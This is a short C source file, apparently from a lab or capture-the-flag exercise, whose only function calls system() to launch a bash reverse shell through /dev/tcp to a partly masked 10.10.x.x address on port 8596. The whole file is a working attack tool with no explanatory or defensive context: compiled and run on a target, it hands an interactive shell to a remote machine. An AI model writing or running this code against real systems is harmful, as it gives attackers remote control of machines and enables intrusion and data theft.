#include <stdlib.h>
int main() {
    system("/bin/bash -c '''bash -i >& /dev/tcp/10.10.xx.xx/8596 0>&1'''");
    return 0;
}